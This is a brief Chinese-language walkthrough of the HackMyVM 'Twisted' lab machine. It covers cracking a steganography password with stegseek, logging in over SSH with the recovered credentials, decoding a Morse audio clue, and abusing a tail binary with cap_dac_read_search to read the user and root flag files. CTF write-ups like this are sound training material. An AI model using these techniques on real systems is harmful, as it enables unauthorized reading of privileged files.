# Twisted

2024-11-05 https://hackmyvm.eu/machines/machine.php?vm=Twisted

## IP

192.168.5.40

## Scan

```
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  ssh
```

先看 80 web 服务，2 张猫图，第二个有隐藏信息，steghide 发现需要输入密码，使用 stegseek 进行爆破：

```
stegseek --crack 1111.jpg /usr/share/wordlists/rockyou.txt
```

发现密码: sexymama 得到隐藏的文件名为 mateo.txt 内容为：

```
thisismypassword
```

猜测可能 ssh -p 2222 的登陆凭据为 mateo/thisismypassword，尝试登陆，登陆成功。

发现提示信息在 wav 文件中：

```
cat note.txt
/var/www/html/gogogo.wav
```

gogogo.wav 音频为摩尔斯码，使用解码工具 https://morsecode.world/international/decoder/audio-decoder-adaptive.html ，得到代表的内容为：

```
GODEEPER . . . COMEWITHME . . . LITTLERABBIT . . .
```

没什么有用信息。

/home/bonita/user.txt 中有 flag 信息，但是必须提权到 bonita 用户。

sudo 和 suid 都没发现特殊地方，getcap 发现 tail 能够读取特权文件：

```
/usr/sbin/getcap -r / 2>/dev/null

/usr/bin/ping = cap_net_raw+ep
/usr/bin/tail = cap_dac_read_search+ep
```

直接读取 bonita 文件夹下的 user flag 文件：

```
mateo@twisted:/home/bonita$ /usr/bin/tail user.txt
HMVblackcat
```

读取 root 文件夹中的 root flag ：

```
mateo@twisted:/home/bonita$ /usr/bin/tail /root/root.txt
HMVwhereismycat
```
